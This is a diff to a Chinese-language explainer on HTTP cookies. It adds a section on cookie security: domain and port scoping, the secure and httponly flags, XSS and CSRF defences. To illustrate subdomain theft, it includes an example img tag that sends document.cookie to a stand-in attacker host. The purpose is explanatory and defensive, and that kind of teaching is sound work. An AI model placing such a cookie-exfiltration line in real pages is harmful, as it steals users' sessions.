@@ -1,7 +1,7 @@
 cookie
 =======
 
-> RFC规范：[HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
+> RFC6265：[HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
 
 > Wiki: [HTTP_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
 
@@ -285,7 +285,7 @@ cookie在浏览器端与在服务端的读写略有差异，服务端能控制�
 
   ```php
   bool setcookie ( string $name [, string $value = "" [, int $expire = 0 [, string $path = "" [, string $domain = "" [, bool $secure = false [, bool $httponly = false ]]]]]] )
-    ```
+  ```
 ## 读取cookie
 
   通过读取 request header 的`cookie` 字段即可，
@@ -294,4 +294,45 @@ cookie在浏览器端与在服务端的读写略有差异，服务端能控制�
 
 # cookie与安全
 
-  TODO:
++ 弱的同源策略
+
+  + domain
+
+  当cookie设置domain的值，则意味着被设置的域及其子域都可以访问此cookie，
+  那么攻击者可通过伪造子域的方式盗取cookie。
+
+  例如：
+
+  设置`token_a=xxx;domain=foo.com;`，那么域名是
+  `foo.com`, `bar.foo.com`的请求都可以获取`token_a`，
+  如果攻击者发布了一个域名是`attack.foo.com`的钓鱼网站，站内有以下脚本
+  `<img src='http://attack.foo.com?cookie=${document.cookie}'></img>`,
+  恰好用户正在浏览`foo.com`，并从某个途径(邮件，qq等)打开了`attack.foo.com`,
+  此时钓鱼可成功盗取在`foo.com`的cookie。
+
+  + port
+
+  cookie对端口是无感知的，在`80`写入的cookie，在`443`端口也可以读取和改写，
+  因此攻击者同样可以伪造一个同域名但不同端口的钓鱼网站来盗取用户的cookie。
+
++ secure
+
+由于http协议的不安全性，使用`secure`字段可限制cookie只在加密协议下传输，
+从而降低降低攻击者在网络传输中截获cookie的可能性。
+
++ xss攻击与httponly
+
+xss攻击通过向网站注入可执行的脚本盗取cookie，
+因此可通过设置httponly避免cookie被js获取，从而降低xss的攻击的可能性，
+但低于xss攻击首先应该是避免网站被注入可执行的脚本，对用户提交的表单使用escape。
+
++ csrf攻击
+
+避免cookie被盗取多是抵御csrf攻击，由于csrf_token有时会使用cookie存储，
+如果cookie被盗取，那么就有可能形成csrf攻击。
+
+抵御cookie被盗取后的csrf，可使用一下几种方式
+
+  + 动态csrf_token：利用scrf_token短效性，即使获取cookie也会在短期内过期失效
+  + 部分Identifiers：cookie中只是部分token内容，即使获取cookie也无法完成完整的校验
+  + Origin，Referer 请求头校验，即使获取到cookie由于同源策略拒绝可接受域的请求
